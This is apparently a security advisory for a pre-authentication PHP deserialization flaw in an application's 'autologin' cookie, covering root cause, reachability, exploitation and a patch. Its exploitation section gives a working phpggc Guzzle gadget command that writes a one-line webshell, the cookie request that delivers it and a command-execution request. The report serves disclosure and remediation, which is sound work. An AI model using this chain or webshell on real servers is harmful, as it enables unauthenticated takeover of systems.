# VULN-01 — PHP Object Injection via `autologin` Cookie (Pre-Auth RCE)

| | |
|---|---|
| **Researcher** | tal7aouy |
| **Severity** | Critical (CVSS 3.1: 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **Authentication** | None (pre-authentication) |
| **Component** | `application/models/Authentication_model.php` |
| **Affected lines** | 194 (`autologin`), 179 (`delete_autologin`), 158 (`create_autologin`) |

---

## 1. Summary

The "remember me" feature stores its cookie as a raw PHP `serialize()` string and reads it back with `unserialize()` on **attacker-controlled input**, on **every request**, **before authentication**. Because CodeIgniter 3 does not encrypt or sign plain cookies, an attacker can supply an arbitrary serialized object. Combined with the Guzzle library shipped in `composer.json`, this yields a public POP gadget chain and therefore **unauthenticated remote code execution**.

## 2. Root cause

CodeIgniter's `set_cookie()` / `get_cookie()` do not provide integrity protection for plain cookies. The application trusts the cookie contents and deserializes them:

```php
// application/models/Authentication_model.php

// create_autologin() — the value is a serialize() blob
set_cookie([
    'name'  => 'autologin',
    'value' => serialize(['user_id' => $user_id, 'key' => $key]),
    'expire'=> 60 * 60 * 24 * 31 * 2,
]);

// autologin() — executed for EVERY not-logged-in request
if ($cookie = get_cookie('autologin', true)) {
    $data = unserialize($cookie);            // <-- SINK: untrusted input
    if (isset($data['key']) and isset($data['user_id'])) { ... }
}
```

### Reachability

`autologin()` is called from:
- `Authentication_model::__construct()`, and
- `App_Controller` → `$this->authentication_model->autologin()`

So any anonymous request to any page reaches `unserialize()`.

## 3. Exploitation

### 3.1 Why it is RCE and not just object injection

`composer.json` requires:

```
"guzzlehttp/guzzle": "^7.4",
"illuminate/collections": "^8.77",
"nesbot/carbon": "^2.55",
```

Guzzle ships classes with `__destruct`/`__toString` gadgets that **phpggc** turns into:
- `Guzzle/FW1` — arbitrary **file write**
- `Guzzle/RCE1` — command execution via a callable sink

Arbitrary file write into the web root = drop a webshell = RCE.

### 3.2 Steps

1. Generate the payload (arbitrary file write of a webshell):
   ```bash
   phpggc -u Guzzle/FW1 /var/www/html/pwn.php '<?php system($_GET["c"]); ?>'
   ```
   `-u` URL-encodes the serialized blob so it is cookie-safe.

2. Send it as the `autologin` cookie to any endpoint:
   ```
   GET / HTTP/1.1
   Host: victim
   Cookie: autologin=O%3A...   (the phpggc output)
   ```

3. The app runs `unserialize()` → the gadget chain executes on object destruction → the file `pwn.php` is written to the web root.

4. Execute commands:
   ```
   GET /pwn.php?c=id
   ```

### 3.3 Caveat

`get_cookie('autologin', true)` runs `xss_clean()` on the value. ASCII-safe Guzzle chains survive this; a payload containing HTML-ish bytes may need adjustment. This affects convenience, not the existence of the vulnerability.

## 4. Impact

- Unauthenticated remote code execution (full server compromise).
- Even without a working gadget: denial of service and arbitrary object instantiation.

## 5. Remediation

**Never pass request-derived data to `unserialize()`.** Store an opaque, non-serialized token and parse it safely. See `patch.diff`.

Key idea:
```php
// write:  "user_id|key"
'value' => (int) $user_id . '|' . $key,

// read:
$parts = explode('|', (string) $cookie, 2);
if (count($parts) === 2 && ctype_digit($parts[0]) && $parts[1] !== '') {
    $data = ['user_id' => (int) $parts[0], 'key' => $parts[1]];
}
```

If a structured value is genuinely required, use `json_decode()` and wrap the cookie value in an HMAC keyed with the application key, verifying it before use.

## 6. References

- phpggc: https://github.com/ambionics/phpggc
- CWE-502: https://cwe.mitre.org/data/definitions/502.html

— tal7aouy
